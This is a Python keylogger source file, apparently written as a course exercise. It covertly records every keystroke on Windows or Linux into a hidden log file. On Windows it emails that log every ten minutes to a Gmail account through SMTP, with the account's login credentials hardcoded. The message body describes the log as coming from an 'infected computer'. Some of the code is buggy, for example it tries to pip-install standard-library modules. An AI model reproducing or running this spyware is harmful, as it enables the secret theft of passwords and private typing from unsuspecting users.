import os

try:
  import datetime
except ImportError:
  print("Trying to Install required module: Datetime\n")
  os.system('python -m pip install datetime')
import datetime

try:
  import logging
except ImportError:
  print("Trying to Install required module: Logging\n")
  os.system('python -m pip install logging')
import logging

try:
  import platform
except ImportError:
  print("Trying to Install required module: Platform\n")
  os.system('python -m pip install platform')
import platform

try:
  import smtplib
except ImportError:
  print("Trying to Install required module: SMTPLib\n")
  os.system('python -m pip install smtplib')
import smtplib

try:
  import time
except ImportError:
  os.system('python -m pip install time')
import time

try:
  import email
except ImportError:
  os.system('python -m pip install email')
import email

from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pynput.keyboard import Key, Listener

mySystem = platform.system()
if mySystem == ('Linux'):
    import pyxhook

#------------------------------------------------------------------------------------------------

userDirPath = os.path.expanduser("~")
windowsExtraPath = '\.py\Logs'
linuxExtraPath   = 'path here'
if(mySystem) == ('Windows'):
    userDirPath += windowsExtraPath
    if not os.path.exists(userDirPath):
        os.makedirs(userDirPath)
if(mySystem) == ('Linux'):
    userDirPath += linuxExtraPath
    if not os.path.exists(userDirPath):
        os.makedirs(userDirPath)


starttime = time.time()

# This will send the log file to the specified email account 
# at the time interval specified.
def sendEmail():
    while True:
        curDir = os.get_exec_path
        email_user = 'csci455keylog@gmail.com'
        email_password = 'Keylog Account!'
        email_send = 'csci455keylog@gmail.com'

        subject = 'Log from: ' + str(userDirPath) + " at " + str(datetime.datetime.now())

        msg = MIMEMultipart()
        msg['From'] = email_user
        msg['To'] = email_send
        msg['Subject'] = subject

        body = 'This email contains a key log file from an infected computer.'
        msg.attach(MIMEText(body,'plain'))

        #filename= os.getcwd() + 'key_log.txt'
        filename = userDirPath + 'key_log.txt'
        # Add log file path to open or filename
        attachment  = open(filename,'rb')

        part = MIMEBase('application','octet-stream')
        part.set_payload((attachment).read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition',"attachment; filename= "+filename)

        msg.attach(part)
        text = msg.as_string()
        server = smtplib.SMTP('smtp.gmail.com',587)
        server.starttls()
        server.login(email_user,email_password)


        server.sendmail(email_user,email_send,text)
        server.quit()
        time.sleep(600.0 - ((time.time() - starttime) % 60.0))

#execute windows keylogger
if mySystem == 'Windows':
    log_dir = ""
    logging.basicConfig(filename=(userDirPath + "key_log.txt"),level=logging.DEBUG,
            format='%(asctime)s: %(message)s')
    def on_press(key):
        logging.info(str(key))
    with Listener(on_press=on_press) as listener:
        sendEmail()
        listener.join()
        

#execute linux keylogger
elif mySystem == 'Linux':
    #change this to the log file's path
    log_file = userDirPath + "key_log.txt"
    #this function is called every time a key is pressed
    def OnKeyPress(event):
        fob = open(log_file,'a')
        fob.write(event.Key)
        fob.write('\n')
        
        #ascii value of the grave key (`)
        if event.Ascii == 96:
            fob.close()
            new_hook.cancel()
    #instanstiate HookManager class
    new_hook = pyxhook.HookManager()
    #listen to all keystrokes
    new_hook.KeyDown = OnKeyPress
    #hook the keyboard
    new_hook.HookKeyboard()
    #start the session
    new_hook.start()
